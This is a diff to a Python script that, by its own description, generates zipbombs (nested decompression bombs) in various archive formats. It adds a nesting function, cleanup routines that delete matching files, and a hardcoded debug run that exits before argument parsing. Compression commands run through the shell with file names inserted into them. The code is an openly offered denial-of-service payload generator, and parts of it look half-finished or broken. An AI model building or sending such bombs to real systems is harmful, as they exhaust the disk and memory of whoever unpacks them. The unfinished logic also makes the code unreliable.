@@ -5,7 +5,7 @@ import sys
 import time
 import os
 import random
-import yaml
+import yaml,re
 import subprocess
 import argparse
 
@@ -21,6 +21,7 @@ class color:
     ENDC = '\033[0m'
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
+
 class log:
     def banner(s):
         if not quiet:
@@ -46,7 +47,7 @@ def rand_str(str_len):
 
 def generate_dummy_file(filename, size):
     char = rand_str(1)
-    log.debug('Random char to use in dummy file: %s' % char)
+    # log.debug('Random char to use in dummy file: %s' % char)
     with open(filename,'w') as f:
         for i in range(1024):
             f.write((size) * char)
@@ -64,27 +65,79 @@ def replace(c, i ,o):
 
 def compress_files(infile, outfile):
     cmd = replace(cmd_multi, infile, outfile)
-    log.debug("Compression using command: %s" % cmd)
+    # log.debug("Compression using command: %s" % cmd)
     subprocess.check_output(cmd, shell=True)
 
 def compress_file(infile, outfile):
     cmd = replace(cmd_single, infile, outfile)
-    log.debug("Compression using command: %s" % cmd)
+    # log.debug("Compression using command: %s" % cmd)
     subprocess.check_output(cmd, shell=True)
 
-def make_copies_and_compress(infile, outfile, n_copies, level):
+def make_copies_and_compress(infile, outfile, n_copies):
     gen_files = []
     for i in range(n_copies):
-        f_name = '%s-%d.%s' % (get_filename_without_extension(infile), i, ext)
+        f_name = '%s-%d.%s' % (get_filename_without_extension(infile),i, ext)
+        if not os.path.exists(f_name):
+            generate_dummy_file(infile, 2)
         shutil.copy(infile, f_name)
         gen_files.append(f_name)
+
     compress_files(' '.join(gen_files), outfile)
     for f_name in gen_files:
         os.remove(f_name)
 
+def del_zip_files():
+    dirs = os.listdir(".")
+    for d in dirs:
+        if d.endswith(ext):
+            os.remove(d)
+
+def del_files(pattern="^\w+\-\d+.%s"):
+    pattern  =pattern % ext 
+    regx = re.compile(pattern)
+    dirs = os.listdir(".")
+    find = ["".join(regx.findall(dir)) for dir in dirs]
+    for i in [dir for dir in find if dir]:
+        print("removed %s" % i)
+        os.remove(i)
+    return find
+    
+def zipbomb(n_levels, nfile):
+    decompressed_size=1 
+    for i in range(1, n_levels+1):
+        tmp_in = '%d.%s' % (i, ext)
+        tmp_out = '%d.%s' %  (i+1, ext)
+        make_copies_and_compress(tmp_in, tmp_out, nfile)
+        decompressed_size *= nfile
+        # os.remove(tmp_in)
+
 if __name__ == '__main__':
     # Define arguments
+
+    if len(sys.argv) > 1:
+        ext = sys.argv[1]
+    else:
+        ext = "lrz"
+
+    del_zip_files()
+
+    with open("config/compress.yaml", 'r') as f:
+        db = yaml.safe_load(f)
+        if len(sys.argv) > 1:
+            if sys.argv[1] == 'list':
+                for key, value in db.items():
+                    print(key)
+                exit()
+        cmd_single = db[ext]['single']
+        cmd_multi = db[ext]['multi']
+
+        print(replace(cmd_single, "test.sh", "brub"))
+
+    zipbomb(2, 2)
+
+    exit()
     parser = argparse.ArgumentParser(description='Generates zipbombs in various formats.', epilog='Usage example: python3 shadrak.py zip' )
+
     parser.add_argument('format',                                                   help='Format of the zipbomb ("list" to list possible values)')
     parser.add_argument('-l', '--level', type=int, default=2,                       help='Levels of nesting')
     parser.add_argument('-n', '--nfile', type=int, default=10,                      help='Number of files in each level')
